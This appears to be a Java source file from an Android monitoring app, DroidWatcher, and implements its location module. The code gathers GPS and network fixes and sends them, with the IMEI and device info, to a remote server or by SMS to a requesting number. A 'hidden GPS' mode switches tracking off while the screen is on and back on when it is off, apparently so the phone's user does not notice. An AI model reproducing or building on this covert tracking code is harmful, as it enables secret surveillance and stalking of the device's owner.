package com.droidwatcher.modules.location;

import java.lang.ref.WeakReference;
import java.util.ArrayList;
import java.util.Date;

import org.acra.ACRA;

import com.droidwatcher.Debug;
import com.droidwatcher.ServerMessanger;
import com.droidwatcher.SettingsManager;
import com.droidwatcher.SmsNotification;
import com.droidwatcher.lib.GPS;
import com.droidwatcher.lib.MessageType;
import com.droidwatcher.modules.DeviceInfoModule;
import com.droidwatcher.receivers.ScreenStateReceiver;
import com.droidwatcher.services.AppService;
import com.droidwatcher.variables.ServerMessage;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.SharedPreferences.OnSharedPreferenceChangeListener;
import android.location.Location;
import android.location.LocationManager;
import android.os.Handler;
import android.os.Message;
import android.preference.PreferenceManager;
import android.support.v4.content.LocalBroadcastManager;
import android.util.Base64;

public class LocationModule implements OnSharedPreferenceChangeListener {
	private Context mContext;
	private SettingsManager mSettings;
	private LocationManager mLocationManager;
	private BroadcastReceiver mScreenStateReceiver;
	private ArrayList<SingleLocationListener> mSingleListeners;
	private ScheduledLocationListener mScheduledListener;
	protected boolean mIsGpsHidden;
	
	private static MyHandler sHandler;
	
	public static final int REQUEST_SINGLE_LOCATION = 1;
	public static final int REQUEST_SINGLE_LOCATION_SMS = 4;
	public static final int REQUEST_SINGLE_LOCATION_ONLINE = 2;
	public static final int REQUEST_SCHEDULED_LOCATION = 3;
	
	private ILocationResultListener mBaseResultListener = new ILocationResultListener() {
		@Override
		public void onLocationResult(Location location) {
			if (AppService.sThreadManager != null && location != null) {
				GPS gps = new GPS(location);
				AppService.sThreadManager.onGPSChange(gps);
			}
		}

		@Override
		public void onNoResult() {}

		@Override
		public void onGsmLocationResult(GPS gps) {
			if (AppService.sThreadManager != null && gps != null) {
				AppService.sThreadManager.onGPSChange(gps);
			}
		}
	};
	
	private ILocationResultListener mOnlineResultListener = new ILocationResultListener() {
		@Override
		public void onNoResult() {
			ServerMessage msg = new ServerMessage(MessageType.ONLINE_POSITION, mSettings.imei(), mSettings.login());
			msg.addParam("error", "no location");
			new ServerMessanger(mContext, msg).start();
		}
		
		@Override
		public void onLocationResult(Location location) {
			ServerMessage msg = new ServerMessage(MessageType.ONLINE_POSITION, mSettings.imei(), mSettings.login());
			msg.addParam("position", new GPS(location).getJSONObject());
			msg.addParam("info", DeviceInfoModule.getDeviceInfo(mContext));
			new ServerMessanger(mContext, msg).start();
		}

		@Override
		public void onGsmLocationResult(GPS gps) {
			ServerMessage msg = new ServerMessage(MessageType.ONLINE_POSITION, mSettings.imei(), mSettings.login());
			msg.addParam("position", gps.getJSONObject());
			msg.addParam("info", DeviceInfoModule.getDeviceInfo(mContext));
			new ServerMessanger(mContext, msg).start();
		}
	};
	
	public LocationModule(Context context){
		mContext = context;
		mSettings = new SettingsManager(context);
		mSingleListeners = new ArrayList<SingleLocationListener>();
		mIsGpsHidden = mSettings.isGpsHidden();
		
		mScreenStateReceiver = new BroadcastReceiver() {
			@Override
			public void onReceive(Context context, Intent intent) {
				int state = intent.getIntExtra(ScreenStateReceiver.SCREEN_STATE_EXTRA, ScreenStateReceiver.SCREEN_STATE_UNKNOWN);
				
				switch (state) {
				case ScreenStateReceiver.SCREEN_STATE_OFF:
					startGpsListeners();
					break;
				case ScreenStateReceiver.SCREEN_STATE_ON:
					if (mIsGpsHidden) {
						stopGpsListeners();
					}
					break;
				default:
					break;
				}
			}
		};
		
		sHandler = new MyHandler(this);
		
		PreferenceManager.getDefaultSharedPreferences(context).registerOnSharedPreferenceChangeListener(this);
	}
	
	public static final long LOCATION_TIMEOUT = 15 * 60 * 1000;
	public static Location getLocation(Context context){
		try {
			LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
			long time = new Date().getTime() - LOCATION_TIMEOUT;
			Location location = null;
			
			if (locationManager == null) {
				return null;
			}
			
			location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
			
			if (location != null && location.getTime() >= time) {
				return location;
			}
			
			location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
			if (location != null && location.getTime() >= time) {
				return location;
			}
			
		} catch (Exception e) {
			Debug.exception(e);
		}
		
		return null;
	}
	
	protected Context getContext(){
		return mContext;
	}
	
	protected synchronized LocationManager getLocationManager() {
		try {
			if (mLocationManager == null) {
				mLocationManager = (LocationManager) mContext.getSystemService(Context.LOCATION_SERVICE);
			}
			
			return mLocationManager;
			
		} catch (Exception e) {
			Debug.exception(e);
			ACRA.getErrorReporter().handleSilentException(e);
		}
		
		return null;
	}
	
	protected synchronized SettingsManager getSettingsManager() {
		return mSettings;
	}
	
	@Override
	public void onSharedPreferenceChanged(SharedPreferences sharedPreferences, String key) {
		if (key.equals("USE_GPS")){
			if (mSettings.isGpsTrackingEnabled()){
				stopScheduledLocationUpdates();
				startScheduledLocationUpdates();
			}
			else{
				stopScheduledLocationUpdates();
			}
			return;
		}
		
		if (key.equals("GPS_TIMER") ||  key.equals("GPS_ONLY_NEW")){
			stopScheduledLocationUpdates();
			
			if (mSettings.isGpsTrackingEnabled()) {
				startScheduledLocationUpdates();
			}
			return;
		}
		
		if (key.equals("GPS_HIDDEN")) {
			mIsGpsHidden = mSettings.isGpsHidden();
			if (mIsGpsHidden) {
				if (ScreenStateReceiver.getScreenState() != ScreenStateReceiver.SCREEN_STATE_OFF) {
					stopGpsListeners();
				}
			}
			else{
				startGpsListeners();
			}
			return;
		}
	}
	
	public synchronized void start(){
		LocalBroadcastManager.getInstance(mContext).registerReceiver(mScreenStateReceiver, new IntentFilter(ScreenStateReceiver.SCREEN_EVENT));
		
		if (mSettings.isGpsTrackingEnabled()) {
			startScheduledLocationUpdates();
		}
	}
	
	public synchronized void dispose(){
		try {
			try {
				if (getLocationManager() != null && mSingleListeners != null) {
					for (SingleLocationListener listener : mSingleListeners) {
						listener.dispose();
					}
				}
				
			} catch (Exception e) {
				Debug.exception(e);
				ACRA.getErrorReporter().handleSilentException(e);
			}
			
			stopScheduledLocationUpdates();
			
			try {
				PreferenceManager.getDefaultSharedPreferences(mContext).unregisterOnSharedPreferenceChangeListener(this);
				
			} catch (Exception e) {
				Debug.exception(e);
				ACRA.getErrorReporter().handleSilentException(e);
			}
			
			try {
				if (mScreenStateReceiver != null) {
					LocalBroadcastManager.getInstance(mContext).unregisterReceiver(mScreenStateReceiver);
				}
				
			} catch (Exception e) {
				Debug.exception(e);
				ACRA.getErrorReporter().handleSilentException(e);
			}
			
		} finally {
			mScreenStateReceiver = null;
			mSingleListeners = null;
			sHandler = null;
			mLocationManager = null;
		}
	}
	
	private void startScheduledLocationUpdates(){
		if (mScheduledListener != null) {
			stopScheduledLocationUpdates(); 
		}
		
		mScheduledListener = new ScheduledLocationListener(this, mContext);
		mScheduledListener.getLocation(mBaseResultListener);
	}
	
	private void stopScheduledLocationUpdates(){
		if (mScheduledListener != null) {
			mScheduledListener.dispose();
			mScheduledListener = null;
		}
	}
	
	private void scheduledAlarm(){
		if (mScheduledListener == null) {
			startScheduledLocationUpdates();
		}
		
		mScheduledListener.enableByAlarm();
	}
	
	private synchronized void startGpsListeners(){
		try {
			for (SingleLocationListener listener : mSingleListeners) {
				listener.startListner();
			}
			
			if (mScheduledListener != null) {
				mScheduledListener.startListner();
			}
			
		} catch (Exception e) {
			Debug.exception(e);
			ACRA.getErrorReporter().handleSilentException(e);
		}
	}
	
	private synchronized void stopGpsListeners(){
		try {
			for (SingleLocationListener listener : mSingleListeners) {
				listener.stopListner();
			}
			
			if (mScheduledListener != null) {
				mScheduledListener.stopListner();
			}
			
		} catch (Exception e) {
			ACRA.getErrorReporter().handleSilentException(e);
		}
	}
	
	private synchronized void addSingleListner(){
		try {
			SingleLocationListener listener = new SingleLocationListener(this);
			mSingleListeners.add(listener);
			listener.getLocation(mBaseResultListener);
			
		} catch (Exception e) {
			Debug.exception(e);
			ACRA.getErrorReporter().handleSilentException(e);
		}
	}
	
	private synchronized void addSingleListner(String smsResponseNumber){
		try {
			SingleLocationListener listener = new SingleLocationListener(this);
			mSingleListeners.add(listener);
			listener.getLocation(new SmsLocationResultListener(smsResponseNumber));
			
		} catch (Exception e) {
			Debug.exception(e);
			ACRA.getErrorReporter().handleSilentException(e);
		}
	}
	
	private synchronized void addSingleOnlineListner(){
		try {
			SingleLocationListener listener = new SingleLocationListener(this);
			mSingleListeners.add(listener);
			listener.getLocation(mOnlineResultListener);
			
		} catch (Exception e) {
			Debug.exception(e);
			ACRA.getErrorReporter().handleSilentException(e);
		}
	}
	
	protected synchronized void removeListner(SingleLocationListener listener){
		try {
			mSingleListeners.remove(listener);
			listener.dispose();
			
		} catch (Exception e) {
			Debug.exception(e);
			ACRA.getErrorReporter().handleSilentException(e);
		}
	}
	
	public static void message(int what){
		if (sHandler != null) {
			sHandler.sendEmptyMessage(what);
		}
	}
	
	public static void message(Message msg){
		if (sHandler != null) {
			sHandler.sendMessage(msg);
		}
	}
	
	private static class MyHandler extends Handler{
		private final WeakReference<LocationModule> mModule;
		
		private MyHandler(LocationModule module) {
	        mModule = new WeakReference<LocationModule>(module);
	    }
		
		@Override
        public void handleMessage(Message msg) {
			LocationModule module = mModule.get();
			if (module != null) {
				switch (msg.what) {
				case REQUEST_SCHEDULED_LOCATION:
					module.scheduledAlarm();
					break;
				case REQUEST_SINGLE_LOCATION:
					module.addSingleListner();
					break;
				case REQUEST_SINGLE_LOCATION_ONLINE:
					module.addSingleOnlineListner();
					break;
				case REQUEST_SINGLE_LOCATION_SMS:
					module.addSingleListner((String) msg.obj);
					break;
				default:
					return;
				}
			}
		}
	}
	
	private class SmsLocationResultListener implements ILocationResultListener{
		private String mNumber;
		
		public SmsLocationResultListener(String number){
			mNumber = number;
		}
		
		private double round(double value) throws Exception {
		    java.math.BigDecimal bd = new java.math.BigDecimal(value);
		    bd = bd.setScale(3, java.math.BigDecimal.ROUND_HALF_UP);
		    return bd.doubleValue();
		}
		
		private void sendSms(double lat, double lon, double acc){
			try {
				String code = lat + ";" + lon;
				
				String msg = "Lat: " + lat
						+ "; Lon: " + lon
						+ "; Acc: " + acc
						+ "; Code: " + Base64.encodeToString(code.getBytes(), Base64.DEFAULT);
				
				SmsNotification.sendSms(mContext, msg, mNumber);
				
			} catch (Exception e) {
				ACRA.getErrorReporter().handleSilentException(e);
			}
		}

		@Override
		public void onLocationResult(Location location) {
			try {
				if (location == null) {
					SmsNotification.sendSms(mContext, "No data available", mNumber);
					return;
				}
				
				double lat = round(location.getLatitude());
				double lon = round(location.getLongitude());
				double acc = round(location.getAccuracy());
				
				sendSms(lat, lon, acc);
				
			} catch (Exception e) {
				ACRA.getErrorReporter().handleSilentException(e);
			}
		}

		@Override
		public void onNoResult() {
			SmsNotification.sendSms(mContext, "No data available", mNumber);
		}

		@Override
		public void onGsmLocationResult(GPS gps) {
			try {
				if (gps == null) {
					SmsNotification.sendSms(mContext, "No data available", mNumber);
					return;
				}
				
				sendSms(round(gps.lat), round(gps.lon), round(gps.acc));
				
			} catch (Exception e) {
				ACRA.getErrorReporter().handleSilentException(e);
			}
		}
	}
}
